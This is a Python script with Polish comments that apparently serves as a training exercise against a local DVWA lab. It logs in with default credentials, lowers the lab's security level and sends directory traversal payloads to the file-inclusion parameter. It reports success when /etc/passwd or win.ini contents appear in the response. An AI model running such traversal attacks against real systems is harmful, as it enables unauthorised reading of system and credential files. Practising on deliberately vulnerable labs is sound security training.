import requests
from bs4 import BeautifulSoup

# Dane do zalogowania na konto uzytkownika
LOGIN_URL = "http://localhost/dvwa/login.php"
# Adres URL podatnej funkcji w DVWA, specjalnie dla Dircetory Traversal
TARGET_URL = "http://localhost/dvwa/vulnerabilities/fi/"
USERNAME = "admin"
PASSWORD = "password"

# Payloady, które będziemy używać
with open("dir_payloads.txt", "r") as f:
    payloads = f.readlines()


def logowanie():
    # Przechowywanie ciasteczek i danych potrzenych do utrzymania zalogowanego stanu
    session = requests.Session()

    # Pobranie tokenu CSRF potrzbnego do logowania
    response = session.get(LOGIN_URL)
    soup = BeautifulSoup(response.text, "html.parser")             # Prasowanie odpowiedzi strony
    token = soup.find("input", {"name": "user_token"})["value"]

    # Wysłanie danych do logowania wraz z tokenem
    login_data = {
        "username": USERNAME,
        "password": PASSWORD,
        "Login": "Login",
        "user_token": token
    }
    session.post(LOGIN_URL, data=login_data)

    # Zwrócenie sesji z zalogowanym użytkownikiem, aby później ją wykorzystać
    return session

def security_lvl(session):
    security_url = "http://localhost/dvwa/security.php"
    response = session.get(security_url)
    soup = BeautifulSoup(response.text, "html.parser")
    token = soup.find("input", {"name": "user_token"})["value"]

    # Wysłanie POST z danymi
    session.post(security_url, data={
        "security": "low",
        "seclev_submit": "Submit",
        "user_token": token
    })

def scan_traversal(session):
    print("Uruchomienie Directory Traversal...\n")

    # Iterowanie po każdym payloadzie
    for payload in payloads:
        payload = payload.strip()
        params = {"page": payload} #page - parametr, który przyjmje podatność File Inclusion
        response = session.get(TARGET_URL, params=params)

        print(f"Payload: {payload} | Status: {response.status_code}")

        # Sprawdzanie zawartośći odpowiedzi, "root:x:0:0:" dla etc/passwd, "[extensions]" dla win.ini
        if "root:x:0:0:" in response.text or "[extensions]" in response.text:
            print("\nPodatność została znaleziona.")
            print("Payload:", payload)
            break

# Wywołanie funckji
sesja = logowanie()
security_lvl(sesja)
scan_traversal(sesja)
